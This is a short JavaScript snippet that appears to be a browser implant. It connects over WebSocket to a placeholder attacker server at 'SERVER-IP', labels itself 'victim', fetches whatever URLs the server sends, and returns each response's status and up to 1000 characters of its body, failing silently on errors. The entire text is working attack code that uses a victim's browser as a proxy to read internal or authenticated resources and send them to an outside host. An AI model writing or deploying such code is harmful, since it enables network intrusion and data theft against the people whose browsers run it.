const socket = new WebSocket("wss://SERVER-IP:8443/ws");

socket.onopen = () => {
  socket.send("victim");
  console.log("[+] WebSocket connected (victim)");
};

socket.onmessage = async (event) => {
  const data = event.data;

  try {
    const res = await fetch(data);
    if (res.status >= 200 && res.status < 500) {
      const text = await res.text();
      socket.send(`[✅] ${data} → ${res.status}`);
      socket.send(`[📄] Body Preview:\n${text.slice(0, 1000)}\n---`);
    }
  } catch (err) {
    // Fail silently
  }
};
